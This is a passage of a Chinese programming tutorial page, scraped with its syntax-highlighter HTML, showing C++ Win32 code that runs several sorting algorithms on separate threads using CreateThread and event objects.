title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nstatic unsigned long _stdcall MyThreadFun(void* pParam);\r\nhandleRet = CreateThread(NULL, 0, &amp;CThreadTestDlg::MyThreadFun, NULL, 0, &amp;ThreadID);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b74083751827-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b74083751827-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b74083751827-1\"><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">_stdcall </span><span class=\"crayon-e\">MyThreadFun</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pParam</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b74083751827-2\"><span class=\"crayon-v\">handleRet</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">CreateThread</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">CThreadTestDlg</span><span class=\"crayon-o\">::</span><span class=\"crayon-v\">MyThreadFun</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">ThreadID</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<br>\n之所以要声明为static是由于，该函数必须要独立于对象实例来使用，即使没有声明实例也可以使用。</li>\n</ol>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b77569797578\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nint QuickSort(long* Array, int iLow, int iHigh); //快速排序\r\n\r\nint main(int argc, char* argv[])\r\n{\r\n　long data[] = {123,34,546,754,34,74,3,56};\r\n　int iDataLen = 8;\r\n　//为了对各个子线程分别对原始数据进行排序和保存排序结果\r\n　//分别分配内存对data数组的数据进行复制\r\n　long *data1, *data2, *data3, *data4, *data5;\r\n　MySafeArray StructData1, StructData2, StructData3, StructData4;\r\n　data1 = new long[iDataLen];\r\n　memcpy(data1, data, iDataLen &lt;&lt; 2); //把data中的数据复制到data1中\r\n　//内存复制 memcpy(目标内存指针, 源内存指针, 复制字节数), 因为long的长度\r\n　//为4字节,所以复制的字节数为iDataLen &lt;&lt; 2, 即等于iDataLen*4\r\n　StructData1.data = data1;\r\n　StructData1.iLength = iDataLen;\r\n　data2 = new long[iDataLen];\r\n　memcpy(data2, data, iDataLen &lt;&lt; 2);\r\n　StructData2.data = data2;\r\n　StructData2.iLength = iDataLen;\r\n　data3 = new long[iDataLen];\r\n　memcpy(data3, data, iDataLen &lt;&lt; 2);\r\n　StructData3.data = data3;\r\n　StructData3.iLength = iDataLen;\r\n　data4 = new long[iDataLen];\r\n　memcpy(data4, data, iDataLen &lt;&lt; 2);\r\n　StructData4.data = data4;\r\n　StructData4.iLength = iDataLen;\r\n　data5 = new long[iDataLen];\r\n　memcpy(data5, data, iDataLen &lt;&lt; 2);\r\n　unsigned long TID1, TID2, TID3, TID4; \r\n　//对信号量进行初始化\r\n　evtTerminate = CreateEvent(NULL, FALSE, FALSE, \"Terminate\");\r\n　evtPrint = CreateEvent(NULL, FALSE, TRUE, \"PrintResult\");\r\n　//分别建立各个子线程\r\n　CreateThread(NULL, 0, &amp;BubbleSort, &amp;StructData1, NULL, &amp;TID1);\r\n　CreateThread(NULL, 0, &amp;SelectSort, &amp;StructData2, NULL, &amp;TID2);\r\n　CreateThread(NULL, 0, &amp;HeapSort, &amp;StructData3, NULL, &amp;TID3);\r\n　CreateThread(NULL, 0, &amp;InsertSort, &amp;StructData4, NULL, &amp;TID4);\r\n　//在主线程中执行行快速排序，其他排序在子线程中执行 \r\n　QuickSort(data5, 0, iDataLen - 1);\r\n　PrintResult(data5, iDataLen, \"Quick Sort\");\r\n　WaitForSingleObject(evtTerminate, INFINITE); //等待所有的子线程结束\r\n　//所有的子线程结束后，主线程才可以结束\r\n　delete[] data1;\r\n　delete[] data2;\r\n　delete[] data3;\r\n　delete[] data4;\r\n　CloseHandle(evtPrint);\r\n　return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b77569797578-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b77569797578-51\">51</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-1\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">QuickSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLow</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iHigh</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//快速排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-3\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">argc</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">argv</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-4\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-5\">　<span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-cn\">123</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">34</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">546</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">754</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">34</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">74</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">56</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-6\">　<span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iDataLen</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-7\">　<span class=\"crayon-c\">//为了对各个子线程分别对原始数据进行排序和保存排序结果</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-8\">　<span class=\"crayon-c\">//分别分配内存对data数组的数据进行复制</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-9\">　<span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">data1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">data2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">data3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">data4</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">data5</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-10\">　<span class=\"crayon-e\">MySafeArray </span><span class=\"crayon-v\">StructData1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">StructData2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">StructData3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">StructData4</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-11\">　<span class=\"crayon-v\">data1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">iDataLen</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-12\">　<span class=\"crayon-e\">memcpy</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">data1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iDataLen</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//把data中的数据复制到data1中</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-13\">　<span class=\"crayon-c\">//内存复制 memcpy(目标内存指针, 源内存指针, 复制字节数), 因为long的长度</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-14\">　<span class=\"crayon-c\">//为4字节,所以复制的字节数为iDataLen &lt;&lt; 2, 即等于iDataLen*4</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-15\">　<span class=\"crayon-v\">StructData1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">data</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-16\">　<span class=\"crayon-v\">StructData1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">iLength</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iDataLen</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-17\">　<span class=\"crayon-v\">data2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">iDataLen</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-18\">　<span class=\"crayon-e\">memcpy</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">data2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iDataLen</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-19\">　<span class=\"crayon-v\">StructData2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">data</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-20\">　<span class=\"crayon-v\">StructData2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">iLength</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iDataLen</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-21\">　<span class=\"crayon-v\">data3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">iDataLen</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-22\">　<span class=\"crayon-e\">memcpy</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">data3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iDataLen</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-23\">　<span class=\"crayon-v\">StructData3</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">data</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data3</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-24\">　<span class=\"crayon-v\">StructData3</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">iLength</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iDataLen</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-25\">　<span class=\"crayon-v\">data4</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">iDataLen</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-26\">　<span class=\"crayon-e\">memcpy</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">data4</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iDataLen</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-27\">　<span class=\"crayon-v\">StructData4</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">data</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data4</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-28\">　<span class=\"crayon-v\">StructData4</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">iLength</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iDataLen</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-29\">　<span class=\"crayon-v\">data5</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">iDataLen</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-30\">　<span class=\"crayon-e\">memcpy</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">data5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iDataLen</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-31\">　<span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TID1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TID2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TID3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TID4</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-32\">　<span class=\"crayon-c\">//对信号量进行初始化</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-33\">　<span class=\"crayon-v\">evtTerminate</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">CreateEvent</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">FALSE</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">FALSE</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Terminate\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-34\">　<span class=\"crayon-v\">evtPrint</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">CreateEvent</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">FALSE</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">TRUE</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"PrintResult\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-35\">　<span class=\"crayon-c\">//分别建立各个子线程</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-36\">　<span class=\"crayon-e\">CreateThread</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">BubbleSort</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span 